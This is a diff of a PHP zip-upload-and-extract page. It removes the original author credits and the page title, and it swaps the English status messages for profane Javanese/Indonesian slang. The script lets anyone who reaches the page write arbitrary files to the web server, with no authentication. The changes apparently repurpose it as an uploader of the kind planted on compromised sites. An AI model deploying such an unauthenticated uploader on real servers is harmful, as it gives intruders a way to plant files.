@@ -1,11 +1,4 @@
-     <?php
-    /* Simple script to upload a zip file to the webserver and have it unzipped
-       Saves tons of time, think only of uploading Wordpress to the server
-       Thanks to c.bavota (www.bavotasan.com)
-       I have modified the script a little to make it more convenient
-       Modified by: Johan van de Merwe (12.02.2013)
-    */   
-     
+      <?php
     function rmdir_recursive($dir) {
         foreach(scandir($dir) as $file) {
            if ('.' === $file || '..' === $file) continue;
@@ -32,7 +25,7 @@
      
     	$continue = strtolower($name[1]) == 'zip' ? true : false;
     	if(!$continue) {
-    		$message = "The file you are trying to upload is not a .zip file. Please try again.";
+    		$message = "Jancok Iki Kusus File Zip Cok Pokoe Kudu File Zip";
     	}
      
       /* PHP current path */
@@ -63,9 +56,9 @@
      
     			unlink($targetzip);
     		}
-    		$message = "Your .zip file was uploaded and unpacked.";
+    		$message = "File Zip Mu Berhasil Di Upload";
     	} else {	
-    		$message = "There was a problem with the upload. Please try again.";
+    		$message = "Server Goblok iki G iso Upload Cok";
     	}
     }
      
@@ -73,17 +66,13 @@
     ?>
     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
     <html xmlns="http://www.w3.org/1999/xhtml">
-    <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-    <title>Unzip a zip file to the webserver</title>
-    </head>
-     
-    <body>
+    <body><center>
     <?php if($message) echo "<p>$message</p>"; ?>
     <form enctype="multipart/form-data" method="post" action="">
-    <label>Choose a zip file to upload: <input type="file" name="zip_file" /></label>
+    <label>Silahkan Masukan File Zip: <input type="file" name="zip_file" /></label>
     <br />
     <input type="submit" name="submit" value="Upload" />
     </form>
+	</center>
     </body>
     </html>
